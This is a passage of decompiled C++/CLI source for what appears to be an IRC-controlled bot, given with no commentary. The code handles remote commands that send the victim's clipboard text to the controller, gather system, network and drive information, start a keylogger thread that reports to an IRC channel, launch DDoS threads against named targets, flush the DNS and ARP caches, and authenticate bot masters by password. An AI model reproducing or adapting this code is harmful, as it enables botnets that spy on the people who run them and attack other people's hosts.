                                    if (\u003CModule\u003E.strcmp((sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D125, (sbyte*) num13) == 0 || \u003CModule\u003E.strcmp((sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D126, (sbyte*) num13) == 0)
                                    {
                                      if (\u003CModule\u003E.fDnsFlushResolverCache != null)
                                      {
                                        // ISSUE: function pointer call
                                        if (__calli(\u003CModule\u003E.fDnsFlushResolverCache)() != 0)
                                          \u003CModule\u003E._snprintf((sbyte*) &arrayTypeBy0CaaD1, 512U, (sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D127, __arglist ());
                                        else
                                          \u003CModule\u003E._snprintf((sbyte*) &arrayTypeBy0CaaD1, 512U, (sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D128, __arglist ());
                                      }
                                      else
                                        \u003CModule\u003E._snprintf((sbyte*) &arrayTypeBy0CaaD1, 512U, (sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D129, __arglist ());
                                      if (silent == 0)
                                      {
                                        // ISSUE: cast to a reference type
                                        // ISSUE: explicit reference operation
                                        \u003CModule\u003E.irc_privmsg(sock, (sbyte*) ^(int&) ((IntPtr) &arrayTypeBy0CaPad + 8), (sbyte*) &arrayTypeBy0CaaD1, notice, 0);
                                      }
                                      return repeat;
                                    }
                                  }
                                  else
                                  {
                                    if (\u003CModule\u003E.FlushARPCache() != 0)
                                      \u003CModule\u003E._snprintf((sbyte*) &arrayTypeBy0CaaD1, 512U, (sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D123, __arglist ());
                                    else
                                      \u003CModule\u003E._snprintf((sbyte*) &arrayTypeBy0CaaD1, 512U, (sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D124, __arglist ());
                                    if (silent == 0)
                                    {
                                      // ISSUE: cast to a reference type
                                      // ISSUE: explicit reference operation
                                      \u003CModule\u003E.irc_privmsg(sock, (sbyte*) ^(int&) ((IntPtr) &arrayTypeBy0CaPad + 8), (sbyte*) &arrayTypeBy0CaaD1, notice, 0);
                                    }
                                    return repeat;
                                  }
                                }
                                else
                                {
                                  if (silent == 0)
                                  {
                                    // ISSUE: cast to a reference type
                                    // ISSUE: explicit reference operation
                                    \u003CModule\u003E.irc_privmsg(sock, (sbyte*) ^(int&) ((IntPtr) &arrayTypeBy0CaPad + 8), (sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D120, notice, 0);
                                  }
                                  // ISSUE: cast to a reference type
                                  // ISSUE: explicit reference operation
                                  \u003CModule\u003E.irc_privmsg(sock, (sbyte*) ^(int&) ((IntPtr) &arrayTypeBy0CaPad + 8), \u003CModule\u003E.GetClipboardText(), notice, 0);
                                  return repeat;
                                }
                              }
                              else
                              {
                                // ISSUE: cast to a reference type
                                // ISSUE: explicit reference operation
                                \u003CModule\u003E.CheckDLLs(sock, (sbyte*) ^(int&) ((IntPtr) &arrayTypeBy0CaPad + 8), notice, silent);
                                return 1;
                              }
                            }
                            else
                            {
                              \u0024ArrayType\u0024\u0024\u0024BY03_W arrayTypeBy03W;
                              // ISSUE: cast to a reference type
                              // ISSUE: explicit reference operation
                              \u003CModule\u003E.MultiByteToWideChar(0U, 1U, (sbyte*) ^(int&) (num1 * 4 + ((IntPtr) &arrayTypeBy0CaPad + 4)), -1, (char*) &arrayTypeBy03W, 8);
                              // ISSUE: cast to a reference type
                              // ISSUE: explicit reference operation
                              \u003CModule\u003E.DriveInfo(sock, (sbyte*) ^(int&) ((IntPtr) &arrayTypeBy0CaPad + 8), notice, (char*) &arrayTypeBy03W);
                              return 1;
                            }
                          }
                          else
                          {
                            // ISSUE: cast to a reference type
                            // ISSUE: explicit reference operation
                            \u003CModule\u003E.irc_privmsg(sock, (sbyte*) ^(int&) ((IntPtr) &arrayTypeBy0CaPad + 8), \u003CModule\u003E.sysinfo((sbyte*) &arrayTypeBy0CaaD1, sock), notice, 0);
                            return repeat;
                          }
                        }
                        else
                        {
                          // ISSUE: cast to a reference type
                          // ISSUE: explicit reference operation
                          \u003CModule\u003E.irc_privmsg(sock, (sbyte*) ^(int&) ((IntPtr) &arrayTypeBy0CaPad + 8), \u003CModule\u003E.netinfo((sbyte*) &arrayTypeBy0CaaD1, host, sock), notice, 0);
                          return repeat;
                        }
                      }
                      else
                      {
                        // ISSUE: cast to a reference type
                        // ISSUE: explicit reference operation
                        int _SubStr = ^(int&) (num1 * 4 + ((IntPtr) &arrayTypeBy0CaPad + 4));
                        if (_SubStr != 0)
                        {
                          if ((IntPtr) _Str != IntPtr.Zero)
                          {
                            sbyte* numPtr7 = \u003CModule\u003E.strstr(_Str, (sbyte*) _SubStr);
                            if ((IntPtr) numPtr7 != IntPtr.Zero)
                              \u003CModule\u003E.irc_sendv(sock, (sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D101, __arglist ((IntPtr) numPtr7));
                          }
                        }
                        else
                          \u003CModule\u003E.irc_sendv(sock, (sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D102, __arglist ());
                        return -2;
                      }
                    }
                    else
                    {
                      \u003CModule\u003E.irc_sendv(sock, (sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D98, __arglist ());
                      return -1;
                    }
                  }
                  else
                  {
                    \u003CModule\u003E.irc_sendv(sock, (sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D95, __arglist ());
                    return 0;
                  }
                }
                else
                {
                  \u003CModule\u003E.sprintf((sbyte*) &arrayTypeBy0CaaD1, (sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D92, __arglist (out \u003CModule\u003E.version));
                  if (silent == 0)
                  {
                    // ISSUE: cast to a reference type
                    // ISSUE: explicit reference operation
                    \u003CModule\u003E.irc_privmsg(sock, (sbyte*) ^(int&) ((IntPtr) &arrayTypeBy0CaPad + 8), (sbyte*) &arrayTypeBy0CaaD1, notice, 0);
                  }
                  return repeat;
                }
              }
              else
              {
                // ISSUE: cast to a reference type
                // ISSUE: explicit reference operation
                int num21 = ^(int&) (num1 * 4 + ((IntPtr) &arrayTypeBy0CaPad + 4));
                if (num21 != 0)
                {
                  int num22 = \u003CModule\u003E.atoi((sbyte*) num21);
                  if (num22 == 0)
                  {
                    \u0024ArrayType\u0024\u0024\u0024BY0IA\u0040D* arrayTypeBy0IaDPtr = (\u0024ArrayType\u0024\u0024\u0024BY0IA\u0040D*) ((IntPtr) masters + num22 * 128);
                    if (*(sbyte*) arrayTypeBy0IaDPtr != (sbyte) 0)
                    {
                      \u003CModule\u003E.sprintf((sbyte*) &arrayTypeBy0CaaD1, (sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D86, __arglist ((IntPtr) arrayTypeBy0IaDPtr + 1));
                      *(sbyte*) arrayTypeBy0IaDPtr = (sbyte) 0;
                    }
                    else
                      \u003CModule\u003E.sprintf((sbyte*) &arrayTypeBy0CaaD1, (sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D87, __arglist (num22));
                  }
                  else
                    \u003CModule\u003E.sprintf((sbyte*) &arrayTypeBy0CaaD1, (sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D88, __arglist (num22));
                }
                else
                {
                  int num23 = 0;
                  \u0024ArrayType\u0024\u0024\u0024BY0IA\u0040D* arrayTypeBy0IaDPtr = masters;
                  // ISSUE: cast to a reference type
                  // ISSUE: explicit reference operation
                  while (\u003CModule\u003E.strcmp((sbyte*) arrayTypeBy0IaDPtr, (sbyte*) ^(int&) ref arrayTypeBy0CaPad) != 0)
                  {
                    ++num23;
                    arrayTypeBy0IaDPtr += 128;
                    if (num23 >= 1)
                      goto label_166;
                  }
                  *(sbyte*) (num23 * 128 + (IntPtr) masters) = (sbyte) 0;
                  \u003CModule\u003E.sprintf((sbyte*) &arrayTypeBy0CaaD1, (sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D89, __arglist (out arrayTypeBy0BiD));
                }
label_166:
                if (silent == 0)
                {
                  // ISSUE: cast to a reference type
                  // ISSUE: explicit reference operation
                  \u003CModule\u003E.irc_privmsg(sock, (sbyte*) ^(int&) ((IntPtr) &arrayTypeBy0CaPad + 8), (sbyte*) &arrayTypeBy0CaaD1, notice, 0);
                }
                return 1;
              }
            }
            else
            {
              \u003CModule\u003E.replacestr(line, (sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D73, nick1);
              \u003CModule\u003E.replacestr(line, (sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D74, (sbyte*) &arrayTypeBy0BiD);
              // ISSUE: cast to a reference type
              // ISSUE: explicit reference operation
              \u003CModule\u003E.replacestr(line, (sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D75, (sbyte*) ^(int&) ((IntPtr) &arrayTypeBy0CaPad + 8));
              \u003CModule\u003E.replacestr(line, (sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D76, \u003CModule\u003E.rndnick((sbyte*) &arrayTypeBy0MD, 2, 0, (sbyte*) 0));
              \u003CModule\u003E.replacestr(line, (sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D77, server);
              if ((IntPtr) \u003CModule\u003E.strstr(line, (sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D78) != IntPtr.Zero)
              {
                do
                {
                  sbyte* numPtr8 = \u003CModule\u003E.strstr(line, (sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D79);
                  \u003CModule\u003E.strncpy((sbyte*) &arrayTypeBy0MD, numPtr8 + 5, 4U);
                  \u003CModule\u003E.strtok((sbyte*) &arrayTypeBy0MD, (sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D80);
                  // ISSUE: cast to a reference type
                  // ISSUE: explicit reference operation
                  // ISSUE: cast to a reference type
                  // ISSUE: explicit reference operation
                  if (^(sbyte&) ref arrayTypeBy0MD < (sbyte) 48 || ^(sbyte&) ref arrayTypeBy0MD > (sbyte) 57)
                    \u003CModule\u003E.strncpy((sbyte*) &arrayTypeBy0MD, (sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D81, 3U);
                  if (\u003CModule\u003E.atoi((sbyte*) &arrayTypeBy0MD) > 0)
                  {
                    // ISSUE: cast to a reference type
                    // ISSUE: explicit reference operation
                    ^(sbyte&) ref arrayTypeBy02D = (sbyte) \u003CModule\u003E.atoi((sbyte*) &arrayTypeBy0MD);
                  }
                  else
                  {
                    // ISSUE: cast to a reference type
                    // ISSUE: explicit reference operation
                    ^(sbyte&) ref arrayTypeBy02D = (sbyte) (\u003CModule\u003E.rand() % 96 + 32);
                  }
                  // ISSUE: cast to a reference type
                  // ISSUE: explicit reference operation
                  ^(sbyte&) ((IntPtr) &arrayTypeBy02D + 1) = (sbyte) 0;
                  int num24 = (int) \u003CModule\u003E.strlen((sbyte*) &arrayTypeBy0MD);
                  \u003CModule\u003E.memset((void*) &arrayTypeBy0MD, 0, 12U);
                  \u003CModule\u003E.strncpy((sbyte*) &arrayTypeBy0MD, numPtr8, (uint) (num24 + 6));
                  \u003CModule\u003E.replacestr(line, (sbyte*) &arrayTypeBy0MD, (sbyte*) &arrayTypeBy02D);
                }
                while ((IntPtr) \u003CModule\u003E.strstr(line, (sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D78) != IntPtr.Zero);
              }
              \u003CModule\u003E.strncpy((sbyte*) &arrayTypeBy0CaaD2, line, 511U);
              \u003CModule\u003E.strncpy((sbyte*) &arrayTypeBy0CaaD3, (sbyte*) &arrayTypeBy0CaaD2, 511U);
              // ISSUE: cast to a reference type
              // ISSUE: explicit reference operation
              ^(int&) ref arrayTypeBy0CaPad = (int) \u003CModule\u003E.strtok((sbyte*) &arrayTypeBy0CaaD3, (sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D82);
              int num25 = 1;
              do
              {
                // ISSUE: cast to a reference type
                // ISSUE: explicit reference operation
                ^(int&) (num25 * 4 + (IntPtr) &arrayTypeBy0CaPad) = (int) \u003CModule\u003E.strtok((sbyte*) 0, (sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D83);
                ++num25;
              }
              while (num25 < 32);
              // ISSUE: cast to a reference type
              // ISSUE: explicit reference operation
              int num26 = ^(int&) (num1 * 4 + (IntPtr) &arrayTypeBy0CaPad);
              if (num26 == 0)
                return 1;
              // ISSUE: cast to a reference type
              // ISSUE: explicit reference operation
              ^(int&) (num1 * 4 + (IntPtr) &arrayTypeBy0CaPad) = num26 + 3;
            }
            // ISSUE: cast to a reference type
            // ISSUE: explicit reference operation
            int _SubStr1 = ^(int&) (num1 * 4 + ((IntPtr) &arrayTypeBy0CaPad + 4));
            if (_SubStr1 == 0)
              return 1;
            // ISSUE: cast to a reference type
            // ISSUE: explicit reference operation
            int num27 = ^(int&) (num1 * 4 + (IntPtr) &arrayTypeBy0CaPad);
            if (\u003CModule\u003E.strcmp((sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D130, (sbyte*) num27) != 0 && \u003CModule\u003E.strcmp((sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D131, (sbyte*) num27) != 0)
            {
              if (\u003CModule\u003E.strcmp((sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D133, (sbyte*) num27) != 0 && \u003CModule\u003E.strcmp((sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D134, (sbyte*) num27) != 0)
              {
                if (\u003CModule\u003E.strcmp((sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D136, (sbyte*) num27) == 0)
                {
                  if (\u003CModule\u003E.strcmp((sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D137, (sbyte*) _SubStr1) != 0 && \u003CModule\u003E.strcmp((sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D138, (sbyte*) _SubStr1) != 0)
                  {
                    if (\u003CModule\u003E.strcmp((sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D144, (sbyte*) _SubStr1) == 0)
                    {
                      int num28 = \u003CModule\u003E.killthreadid(25, 0);
                      if (num28 > 0)
                        \u003CModule\u003E.sprintf((sbyte*) &arrayTypeBy0CaaD1, (sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D145, __arglist (num28));
                      else
                        \u003CModule\u003E.sprintf((sbyte*) &arrayTypeBy0CaaD1, (sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D146, __arglist ());
                    }
                  }
                  else if (\u003CModule\u003E.findthreadid(25) > 0)
                  {
                    \u003CModule\u003E.sprintf((sbyte*) &arrayTypeBy0CaaD1, (sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D139, __arglist ());
                  }
                  else
                  {
                    KEYLOG keylog;
                    // ISSUE: cast to a reference type
                    // ISSUE: explicit reference operation
                    ^(int&) ref keylog = (int) sock;
                    // ISSUE: cast to a reference type
                    // ISSUE: explicit reference operation
                    ^(int&) ((IntPtr) &keylog + 136) = notice;
                    int num29 = \u003CModule\u003E.strcmp((sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D140, (sbyte*) _SubStr1) != 0 ? silent : 1;
                    // ISSUE: cast to a reference type
                    // ISSUE: explicit reference operation
                    ^(int&) ((IntPtr) &keylog + 140) = num29;
                    // ISSUE: cast to a reference type
                    // ISSUE: explicit reference operation
                    uint num30 = (uint) ^(int&) (num1 * 4 + ((IntPtr) &arrayTypeBy0CaPad + 8));
                    // ISSUE: cast to a reference type
                    // ISSUE: explicit reference operation
                    // ISSUE: cast to a reference type
                    sbyte* numPtr9 = num30 == 0U ? (\u003CModule\u003E.strcmp((sbyte*) &\u003CModule\u003E.keylogchan, (sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D141) != 0 ? (sbyte*) &\u003CModule\u003E.keylogchan : (sbyte*) (\u0024ArrayType\u0024\u0024\u0024BY09D&) ^(int&) ((IntPtr) &arrayTypeBy0CaPad + 8)) : (sbyte*) num30;
                    \u003CModule\u003E._snprintf((sbyte*) ((IntPtr) &keylog + 8), 128U, numPtr9, __arglist ());
                    \u003CModule\u003E.sprintf((sbyte*) &arrayTypeBy0CaaD1, (sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D142, __arglist ());
                    // ISSUE: cast to a reference type
                    // ISSUE: explicit reference operation
                    ^(int&) ((IntPtr) &keylog + 4) = \u003CModule\u003E.addthread((sbyte*) &arrayTypeBy0CaaD1, 25, 0U);
                    // ISSUE: cast to a function pointer type
                    void* thread = \u003CModule\u003E.CreateThread((_SECURITY_ATTRIBUTES*) 0, 0U, (__FnPtr<uint (void*)>) (IntPtr) \u003CModule\u003E.__unep\u0040\u003FKeyLoggerThread\u0040\u0040\u0024\u0024FYGKPAX\u0040Z, (void*) &keylog, 0U, &num2);
                    // ISSUE: cast to a reference type
                    // ISSUE: explicit reference operation
                    // ISSUE: cast to a reference type
                    // ISSUE: explicit reference operation
                    ^(int&) (^(int&) ((IntPtr) &keylog + 4) * 564 + ((IntPtr) &\u003CModule\u003E.threads + 532)) = (int) thread;
                    if ((IntPtr) thread != IntPtr.Zero)
                    {
                      // ISSUE: cast to a reference type
                      // ISSUE: explicit reference operation
                      if (^(int&) ((IntPtr) &keylog + 144) == 0)
                      {
                        // ISSUE: cast to a reference type
                        // ISSUE: explicit reference operation
                        do
                        {
                          \u003CModule\u003E.Sleep(50U);
                        }
                        while (^(int&) ((IntPtr) &keylog + 144) == 0);
                      }
                    }
                    else
                      \u003CModule\u003E.sprintf((sbyte*) &arrayTypeBy0CaaD1, (sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D143, __arglist ((int) \u003CModule\u003E.GetLastError()));
                  }
                  if (silent == 0)
                  {
                    // ISSUE: cast to a reference type
                    // ISSUE: explicit reference operation
                    \u003CModule\u003E.irc_privmsg(sock, (sbyte*) ^(int&) ((IntPtr) &arrayTypeBy0CaPad + 8), (sbyte*) &arrayTypeBy0CaaD1, notice, 0);
                  }
                  return 1;
                }
                // ISSUE: cast to a reference type
                // ISSUE: explicit reference operation
                uint num31 = (uint) ^(int&) (num1 * 4 + ((IntPtr) &arrayTypeBy0CaPad + 8));
                if (num31 == 0U)
                  return 1;
                if (\u003CModule\u003E.strcmp((sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D147, (sbyte*) num27) != 0 && \u003CModule\u003E.strcmp((sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D148, (sbyte*) num27) != 0)
                {
                  // ISSUE: cast to a reference type
                  // ISSUE: explicit reference operation
                  uint num32 = (uint) ^(int&) (num1 * 4 + ((IntPtr) &arrayTypeBy0CaPad + 12));
                  if (num32 == 0U)
                    return 1;
                  if (\u003CModule\u003E.strcmp((sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D150, (sbyte*) num27) == 0 || \u003CModule\u003E.strcmp((sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D151, (sbyte*) num27) == 0 || \u003CModule\u003E.strcmp((sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D152, (sbyte*) num27) == 0)
                  {
                    DDOS ddos;
                    \u003CModule\u003E.strncpy((sbyte*) ((IntPtr) &ddos + 8), (sbyte*) _SubStr1, (uint) sbyte.MaxValue);
                    \u003CModule\u003E.strncpy((sbyte*) ((IntPtr) &ddos + 136), (sbyte*) num31, (uint) sbyte.MaxValue);
                    \u003CModule\u003E.strncpy((sbyte*) ((IntPtr) &ddos + 264), (sbyte*) num32, (uint) sbyte.MaxValue);
                    // ISSUE: cast to a reference type
                    // ISSUE: explicit reference operation
                    \u003CModule\u003E.strncpy((sbyte*) ((IntPtr) &ddos + 392), (sbyte*) ^(int&) ((IntPtr) &arrayTypeBy0CaPad + 8), (uint) sbyte.MaxValue);
                    \u003CModule\u003E.strncpy((sbyte*) ((IntPtr) &ddos + 520), (sbyte*) num27, 32U);
                    // ISSUE: cast to a reference type
                    // ISSUE: explicit reference operation
                    ^(int&) ((IntPtr) &ddos + 648) = notice;
                    // ISSUE: cast to a reference type
                    // ISSUE: explicit reference operation
                    ^(int&) ((IntPtr) &ddos + 652) = silent;
                    // ISSUE: cast to a reference type
                    // ISSUE: explicit reference operation
                    ^(int&) ref ddos = (int) sock;
                    \u003CModule\u003E.sprintf((sbyte*) &arrayTypeBy0CaaD1, (sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D153, __arglist (_SubStr1, (int) num31, (int) num32));
                    // ISSUE: cast to a reference type
                    // ISSUE: explicit reference operation
                    ^(int&) ((IntPtr) &ddos + 4) = \u003CModule\u003E.addthread((sbyte*) &arrayTypeBy0CaaD1, 9, 0U);
                    // ISSUE: cast to a function pointer type
                    void* thread = \u003CModule\u003E.CreateThread((_SECURITY_ATTRIBUTES*) 0, 0U, (__FnPtr<uint (void*)>) (IntPtr) \u003CModule\u003E.__unep\u0040\u003FDDOSThread\u0040\u0040\u0024\u0024FYGKPAX\u0040Z, (void*) &ddos, 0U, &num2);
                    // ISSUE: cast to a reference type
                    // ISSUE: explicit reference operation
                    // ISSUE: cast to a reference type
                    // ISSUE: explicit reference operation
                    ^(int&) (^(int&) ((IntPtr) &ddos + 4) * 564 + ((IntPtr) &\u003CModule\u003E.threads + 532)) = (int) thread;
                    if ((IntPtr) thread != IntPtr.Zero)
                    {
                      // ISSUE: cast to a reference type
                      // ISSUE: explicit reference operation
                      if (^(int&) ((IntPtr) &ddos + 656) == 0)
                      {
                        // ISSUE: cast to a reference type
                        // ISSUE: explicit reference operation
                        do
                        {
                          \u003CModule\u003E.Sleep(50U);
                        }
                        while (^(int&) ((IntPtr) &ddos + 656) == 0);
                      }
                    }
                    else
                      \u003CModule\u003E.sprintf((sbyte*) &arrayTypeBy0CaaD1, (sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D154, __arglist ((int) \u003CModule\u003E.GetLastError()));
                    if (silent == 0)
                    {
                      // ISSUE: cast to a reference type
                      // ISSUE: explicit reference operation
                      \u003CModule\u003E.irc_privmsg(sock, (sbyte*) ^(int&) ((IntPtr) &arrayTypeBy0CaPad + 8), (sbyte*) &arrayTypeBy0CaaD1, notice, 0);
                    }
                    return 1;
                  }
                }
                else
                {
                  if ((IntPtr) _Str != IntPtr.Zero)
                  {
                    sbyte* numPtr10 = \u003CModule\u003E.strstr(_Str, (sbyte*) _SubStr1);
                    if ((IntPtr) numPtr10 != IntPtr.Zero)
                      \u003CModule\u003E.irc_sendv(sock, (sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D149, __arglist ((IntPtr) numPtr10));
                  }
                  return repeat;
                }
              }
              else
              {
                // ISSUE: cast to a reference type
                // ISSUE: explicit reference operation
                \u003CModule\u003E.irc_sendv(sock, (sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D135, __arglist (_SubStr1, ^(int&) (num1 * 4 + ((IntPtr) &arrayTypeBy0CaPad + 8))));
                return repeat;
              }
            }
            else
            {
              \u003CModule\u003E.irc_sendv(sock, (sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D132, __arglist (_SubStr1));
              return repeat;
            }
          }
        }
        else
        {
          // ISSUE: cast to a reference type
          // ISSUE: explicit reference operation
          int num33 = ^(int&) (num1 * 4 + ((IntPtr) &arrayTypeBy0CaPad + 4));
          if (num33 == 0 || num3 != 0)
            return 1;
          // ISSUE: cast to a reference type
          // ISSUE: explicit reference operation
          sbyte* numPtr = \u003CModule\u003E.strtok((sbyte*) ^(int&) ref arrayTypeBy0CaPad, (sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D58) + 1;
          \u003CModule\u003E.strtok(\u003CModule\u003E.strtok((sbyte*) 0, (sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D59), (sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D60);
          if (\u003CModule\u003E.strcmp((sbyte*) &\u003CModule\u003E.password, (sbyte*) num33) != 0)
          {
            \u003CModule\u003E.irc_sendv(sock, (sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D62, __arglist (out arrayTypeBy0BiD, out arrayTypeBy0BiD, out \u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D61));
            \u003CModule\u003E.irc_sendv(sock, (sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D63, __arglist (out arrayTypeBy0BiD));
            \u003CModule\u003E.sprintf((sbyte*) &arrayTypeBy0CaaD1, (sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D64, __arglist ((IntPtr) numPtr, out \u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D61));
            return 1;
          }
          int num34 = 0;
          // ISSUE: cast to a reference type
          // ISSUE: explicit reference operation
          while (\u003CModule\u003E.strcmp((sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D61, (sbyte*) ^(int&) (num34 + (IntPtr) &\u003CModule\u003E.authost)) != 0)
          {
            num34 += 4;
            if ((uint) num34 >= 4U)
            {
              \u003CModule\u003E.irc_sendv(sock, (sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D65, __arglist (out arrayTypeBy0BiD, out arrayTypeBy0BiD, out \u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D61));
              \u003CModule\u003E.irc_sendv(sock, (sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D66, __arglist (out arrayTypeBy0BiD));
              \u003CModule\u003E.sprintf((sbyte*) &arrayTypeBy0CaaD1, (sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D67, __arglist ((IntPtr) numPtr, out \u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D61));
              return 1;
            }
          }
          int num35 = 0;
          \u0024ArrayType\u0024\u0024\u0024BY0IA\u0040D* arrayTypeBy0IaDPtr = masters;
          while (*(sbyte*) arrayTypeBy0IaDPtr != (sbyte) 0 || \u003CModule\u003E.strcmp((sbyte*) &\u003CModule\u003E.password, (sbyte*) num33) != 0)
          {
            ++num35;
            arrayTypeBy0IaDPtr += 128;
            if (num35 >= 1)
              goto label_232;
          }
          \u003CModule\u003E.strncpy((sbyte*) (num35 * 128 + (IntPtr) masters), (sbyte*) &arrayTypeBy0IaD, (uint) sbyte.MaxValue);
          if (silent == 0)
          {
            // ISSUE: cast to a reference type
            // ISSUE: explicit reference operation
            \u003CModule\u003E.irc_privmsg(sock, (sbyte*) ^(int&) ((IntPtr) &arrayTypeBy0CaPad + 8), (sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D68, notice, 0);
          }
label_232:
          return 1;
        }
      }
      return repeat;
    }
    \u003CModule\u003E.irc_sendv(sock, (sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D25, __arglist ((IntPtr) nick1));
    \u003CModule\u003E.irc_sendv(sock, (sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D26, __arglist ((IntPtr) nick1));
    \u003CModule\u003E.irc_sendv(sock, (sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D27, __arglist ((IntPtr) channel, (IntPtr) chanpass));
    \u003CModule\u003E.success = 1;
    return 1;
  }

  internal static unsafe uint DDOSThread(void* param)
  {
    DDOS ddos;
    // ISSUE: cpblk instruction
    __memcpy(ref ddos, (IntPtr) param, 660);
